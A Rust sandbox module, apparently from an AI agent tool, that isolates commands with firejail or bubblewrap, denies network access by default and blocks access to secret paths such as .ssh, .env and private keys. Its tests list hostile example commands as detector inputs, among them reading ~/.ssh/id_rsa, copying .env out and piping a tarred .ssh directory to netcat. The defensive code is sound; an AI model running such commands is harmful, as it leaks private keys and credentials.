use async_trait::async_trait;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

pub mod backends;

#[cfg(target_os = "linux")]
mod linux_hardened {
    // ─── Real local-hardened sandbox (Linux userspace isolation) ────────────────
    // §3.5: "filesystem allow-list scoped to workspace, network deny by default".
    //
    // When `firejail` or `bwrap` is on PATH we wrap the command with it: the
    // filesystem is scoped to the workspace and the network is severed. When
    // neither is available we DELEGATE to `LocalSandbox` rather than reaching for
    // `unshare --root` (which needs CAP_SYS_ADMIN/root and would break exec for
    // ordinary users). That keeps this backend a strict superset of the previous
    // default: never weaker, never requiring privileges.

    use super::{Command, ExecResult, FsNetPolicy, Limits, LocalSandbox, Sandbox};
    use std::path::PathBuf;

    pub struct HardenedSandbox {
        root: PathBuf,
        policy: FsNetPolicy,
        /// Fallback executor + shared per-arg denied-path / workdir enforcement.
        inner: LocalSandbox,
    }

    impl HardenedSandbox {
        pub fn new(root: PathBuf) -> Self {
            let policy = FsNetPolicy {
                allowed_paths: vec![root.clone()],
                allow_network: false,
                ..FsNetPolicy::default()
            };
            let inner = LocalSandbox::new(root.clone()).with_policy(policy.clone());
            Self {
                root,
                policy,
                inner,
            }
        }

        /// Wrap `cmd` with `firejail` if present, scoping the filesystem to the
        /// workspace and (unless the policy allows it) severing the network.
        fn firejail(&self, cmd: &Command, limits: &Limits) -> Command {
            let mut args = vec![
                "--quiet".to_string(),
                format!("--timeout={}", (limits.timeout_ms / 1000).max(1)),
                format!("--private={}", self.root.display()),
            ];
            if !self.policy.allow_network {
                args.push("--net=none".to_string());
            }
            for path in &self.policy.allowed_paths {
                args.push(format!("--whitelist={}", path.display()));
            }
            args.push("--".to_string());
            args.push(cmd.program.clone());
            args.extend(cmd.args.clone());
            Command {
                program: "firejail".to_string(),
                args,
                env: cmd.env.clone(),
                workdir: cmd.workdir.clone(),
            }
        }

        /// Wrap `cmd` with `bwrap` (bubblewrap): read-only system dirs, the
        /// workspace bind-mounted read-write, network unshared by default.
        fn bwrap(&self, cmd: &Command) -> Command {
            let root = self.root.display().to_string();
            let mut args = vec![
                "--ro-bind".to_string(),
                "/usr".to_string(),
                "/usr".to_string(),
                "--ro-bind".to_string(),
                "/bin".to_string(),
                "/bin".to_string(),
                "--ro-bind".to_string(),
                "/lib".to_string(),
                "/lib".to_string(),
                "--ro-bind-try".to_string(),
                "/lib64".to_string(),
                "/lib64".to_string(),
                "--ro-bind-try".to_string(),
                "/etc/resolv.conf".to_string(),
                "/etc/resolv.conf".to_string(),
                "--proc".to_string(),
                "/proc".to_string(),
                "--dev".to_string(),
                "/dev".to_string(),
                "--bind".to_string(),
                root.clone(),
                root.clone(),
                "--chdir".to_string(),
                root,
            ];
            if !self.policy.allow_network {
                args.push("--unshare-net".to_string());
            }
            args.push("--".to_string());
            args.push(cmd.program.clone());
            args.extend(cmd.args.clone());
            Command {
                program: "bwrap".to_string(),
                args,
                env: cmd.env.clone(),
                workdir: cmd.workdir.clone(),
            }
        }
    }

    #[async_trait::async_trait]
    impl Sandbox for HardenedSandbox {
        async fn exec(&self, cmd: &Command, limits: &Limits) -> anyhow::Result<ExecResult> {
            // Always route through `inner.exec`, which enforces the workdir-escape
            // and per-arg denied-path checks and handles the timeout uniformly —
            // whether we run the raw command or a firejail/bwrap-wrapped one.
            let effective = if which("firejail") {
                self.firejail(cmd, limits)
            } else if which("bwrap") {
                self.bwrap(cmd)
            } else {
                cmd.clone()
            };
            self.inner.exec(&effective, limits).await
        }

        fn root(&self) -> &std::path::Path {
            &self.root
        }

        fn policy(&self) -> &FsNetPolicy {
            &self.policy
        }
    }

    fn which(cmd: &str) -> bool {
        std::process::Command::new("which")
            .arg(cmd)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }
}

#[cfg(target_os = "linux")]
pub use linux_hardened::HardenedSandbox;

#[cfg(not(target_os = "linux"))]
pub struct HardenedSandbox {
    _root: PathBuf,
    _policy: FsNetPolicy,
}

#[cfg(not(target_os = "linux"))]
impl HardenedSandbox {
    pub fn new(root: PathBuf) -> Self {
        Self {
            _root: root,
            _policy: FsNetPolicy::default(),
        }
    }
}

#[cfg(not(target_os = "linux"))]
#[async_trait::async_trait]
impl Sandbox for HardenedSandbox {
    async fn exec(&self, _cmd: &Command, _limits: &Limits) -> anyhow::Result<ExecResult> {
        Ok(ExecResult {
            stdout: String::new(),
            stderr: "local-hardened sandbox requires Linux (firejail/bwrap/unshare)".into(),
            exit_code: 127,
        })
    }

    fn root(&self) -> &Path {
        &self._root
    }

    fn policy(&self) -> &FsNetPolicy {
        &self._policy
    }
}

// ─── Command and limits ─────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct Command {
    pub program: String,
    pub args: Vec<String>,
    pub env: HashMap<String, String>,
    pub workdir: PathBuf,
}

#[derive(Debug, Clone)]
pub struct Limits {
    pub timeout_ms: u64,
    pub max_output_bytes: usize,
}

#[derive(Debug, Clone)]
pub struct ExecResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}

// ─── File system and network policy ─────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct FsNetPolicy {
    pub allowed_paths: Vec<PathBuf>,
    pub allow_network: bool,
    /// Paths that must never be touched (relative to `root`, matched as prefix).
    /// Defaults include `.git`, `.env`, `.ssh`, `id_rsa`, `id_ed25519` etc.
    pub denied_paths: Vec<PathBuf>,
    /// If non-empty, only env vars whose name appears in this list are forwarded
    /// to the child process. Empty means "pass through everything explicitly set
    /// on the Command" (no implicit env stripping).
    pub env_allowlist: Vec<String>,
}

impl Default for FsNetPolicy {
    fn default() -> Self {
        Self {
            allowed_paths: vec![],
            allow_network: false,
            denied_paths: default_denied_paths(),
            env_allowlist: Vec::new(),
        }
    }
}

/// The default set of paths that no sandbox is allowed to touch — matched as
/// path components, so any segment named `.git`, `.env`, `.ssh`, etc. trips the
/// guard. Kept in sync with `PermissionConfig`'s default denied paths.
pub fn default_denied_paths() -> Vec<PathBuf> {
    vec![
        PathBuf::from(".git"),
        PathBuf::from(".env"),
        PathBuf::from(".env.local"),
        PathBuf::from(".ssh"),
        PathBuf::from("id_rsa"),
        PathBuf::from("id_ed25519"),
    ]
}

/// True if `path` (after canonicalization fall-back) is inside or equal to any
/// denied path under `root`, matched by path components rather than substring.
pub fn path_is_denied(path: &Path, denied: &[PathBuf]) -> bool {
    let comps: Vec<String> = path
        .components()
        .filter_map(|c| match c {
            std::path::Component::Normal(s) => Some(s.to_string_lossy().to_string()),
            _ => None,
        })
        .collect();
    for d in denied {
        let d_comps: Vec<String> = d
            .components()
            .filter_map(|c| match c {
                std::path::Component::Normal(s) => Some(s.to_string_lossy().to_string()),
                _ => None,
            })
            .collect();
        if d_comps.is_empty() {
            continue;
        }
        if comps
            .windows(d_comps.len())
            .any(|w| w == d_comps.as_slice())
        {
            return true;
        }
        if comps.last() == d_comps.last() && d_comps.len() == 1 {
            return true;
        }
    }
    false
}

/// Best-effort scan of a *shell command string* (e.g. the argument to `sh -c`)
/// for references to denied paths, returning the offending token if found.
///
/// IMPORTANT — this is defence-in-depth, NOT isolation. A `sh -c "<string>"`
/// invocation can read anything the process user can via globs (`.s*h`), shell
/// expansion (`$HOME/.ssh`), here-docs, or an alternate reader, none of which
/// this catches. It exists to stop the obvious, literal `cat ~/.ssh/id_rsa`
/// class of accidents/prompt-injections; for real confinement use the
/// `local-hardened` (Linux namespaces) or `docker`/`ssh` sandbox backends.
///
/// We tokenise on shell metacharacters and whitespace, strip quotes, and run
/// each path-shaped token through [`path_is_denied`].
pub fn command_touches_denied_path(cmd: &str, denied: &[PathBuf]) -> Option<String> {
    if denied.is_empty() {
        return None;
    }
    let is_sep = |c: char| {
        c.is_whitespace()
            || matches!(
                c,
                ';' | '|' | '&' | '<' | '>' | '(' | ')' | '{' | '}' | '`' | '"' | '\'' | '=' | ','
            )
    };
    for raw in cmd.split(is_sep) {
        let token = raw.trim_matches(|c| matches!(c, '"' | '\'' | '`'));
        if token.is_empty() {
            continue;
        }
        // Only bother with tokens that look like a path or a bare sensitive name.
        let path_shaped = token.contains('/') || token.contains('\\') || token.starts_with('.');
        if !path_shaped && !token.contains("id_") {
            continue;
        }
        if path_is_denied(Path::new(token), denied) {
            return Some(token.to_string());
        }
    }
    None
}

// ─── THE SANDBOX TRAIT ──────────────────────────────────────────────────────────

/// Isolates `exec`/`Mutating` actions. Backends are selectable per run.
#[async_trait]
pub trait Sandbox: Send + Sync {
    async fn exec(&self, cmd: &Command, limits: &Limits) -> anyhow::Result<ExecResult>;
    fn root(&self) -> &Path;
    fn policy(&self) -> &FsNetPolicy;
}

// ─── Local sandbox implementation ───────────────────────────────────────────────

pub struct LocalSandbox {
    root: PathBuf,
    policy: FsNetPolicy,
}

impl LocalSandbox {
    pub fn new(root: PathBuf) -> Self {
        Self {
            root: root.clone(),
            policy: FsNetPolicy {
                allowed_paths: vec![root],
                allow_network: true,
                ..FsNetPolicy::default()
            },
        }
    }

    pub fn hardened(root: PathBuf) -> Self {
        Self {
            root: root.clone(),
            policy: FsNetPolicy {
                allowed_paths: vec![root],
                allow_network: false, // deny by default for hardened
                ..FsNetPolicy::default()
            },
        }
    }

    pub fn with_policy(mut self, policy: FsNetPolicy) -> Self {
        self.policy = policy;
        self
    }
}

#[async_trait]
impl Sandbox for LocalSandbox {
    async fn exec(&self, cmd: &Command, limits: &Limits) -> anyhow::Result<ExecResult> {
        use std::process::Command as StdCommand;
        use std::time::Instant;

        let root = self
            .root
            .canonicalize()
            .unwrap_or_else(|_| self.root.clone());
        let workdir = cmd
            .workdir
            .canonicalize()
            .unwrap_or_else(|_| cmd.workdir.clone());
        if !workdir.starts_with(&root) {
            anyhow::bail!(
                "Command workdir escapes sandbox root: {}",
                cmd.workdir.display()
            );
        }

        if path_is_denied(&workdir, &self.policy.denied_paths) {
            anyhow::bail!(
                "Command workdir hits a protected path: {}",
                cmd.workdir.display()
            );
        }
        for arg in &cmd.args {
            let p = Path::new(arg);
            if path_is_denied(p, &self.policy.denied_paths) {
                anyhow::bail!("Command argument refers to a protected path: {}", arg);
            }
        }

        let env: HashMap<String, String> = if self.policy.env_allowlist.is_empty() {
            cmd.env.clone()
        } else {
            cmd.env
                .iter()
                .filter(|(k, _)| self.policy.env_allowlist.iter().any(|a| a == *k))
                .map(|(k, v)| (k.clone(), v.clone()))
                .collect()
        };

        let mut builder = StdCommand::new(&cmd.program);
        builder
            .args(&cmd.args)
            .current_dir(&workdir)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        if !self.policy.env_allowlist.is_empty() {
            builder.env_clear();
        }
        builder.envs(&env);
        let mut child = builder.spawn()?;

        let start = Instant::now();
        let timeout = std::time::Duration::from_millis(limits.timeout_ms);

        // Simple timeout via polling
        loop {
            match child.try_wait()? {
                Some(status) => {
                    let output = child.wait_with_output()?;
                    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                    let exit_code = status.code().unwrap_or(-1);

                    return Ok(ExecResult {
                        stdout: truncate(stdout, limits.max_output_bytes),
                        stderr: truncate(stderr, limits.max_output_bytes),
                        exit_code,
                    });
                }
                None => {
                    if start.elapsed() > timeout {
                        let _ = child.kill();
                        return Ok(ExecResult {
                            stdout: String::new(),
                            stderr: "TIMEOUT".to_string(),
                            exit_code: -1,
                        });
                    }
                    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                }
            }
        }
    }

    fn root(&self) -> &Path {
        &self.root
    }

    fn policy(&self) -> &FsNetPolicy {
        &self.policy
    }
}

fn truncate(s: String, max_bytes: usize) -> String {
    if s.len() <= max_bytes {
        s
    } else {
        let truncate_at = max_bytes.saturating_sub(100);
        format!(
            "{}\n... [truncated, {} bytes total]",
            &s[..truncate_at.min(s.len())],
            s.len()
        )
    }
}

#[cfg(test)]
mod denied_path_tests {
    use super::{command_touches_denied_path, default_denied_paths, path_is_denied};
    use std::path::{Path, PathBuf};

    #[test]
    fn path_is_denied_matches_components_not_substrings() {
        let denied = default_denied_paths();
        assert!(path_is_denied(Path::new("/home/u/.ssh/id_rsa"), &denied));
        assert!(path_is_denied(Path::new("project/.env"), &denied));
        assert!(path_is_denied(Path::new("id_ed25519"), &denied));
        // `.environment` must NOT trip the `.env` rule (component, not prefix).
        assert!(!path_is_denied(
            Path::new("src/.environment/notes"),
            &denied
        ));
        assert!(!path_is_denied(Path::new("src/main.rs"), &denied));
    }

    #[test]
    fn command_guard_catches_literal_secret_reads() {
        let denied = default_denied_paths();
        assert!(command_touches_denied_path("cat ~/.ssh/id_rsa", &denied).is_some());
        assert!(command_touches_denied_path("cat /home/u/.ssh/id_rsa", &denied).is_some());
        assert!(command_touches_denied_path("cp .env /tmp/x", &denied).is_some());
        assert!(command_touches_denied_path("echo hi > project/.git/hooks/x", &denied).is_some());
        // quoted / piped variants still tokenise
        assert!(command_touches_denied_path("tar c '.ssh' | nc x 1", &denied).is_some());
    }

    #[test]
    fn command_guard_allows_benign_commands() {
        let denied = default_denied_paths();
        assert!(command_touches_denied_path("cargo test --all", &denied).is_none());
        assert!(command_touches_denied_path("ls -la src/", &denied).is_none());
        assert!(command_touches_denied_path("grep -r TODO crates/", &denied).is_none());
    }

    #[test]
    fn command_guard_empty_denylist_is_noop() {
        assert!(command_touches_denied_path("cat ~/.ssh/id_rsa", &[] as &[PathBuf]).is_none());
    }
}
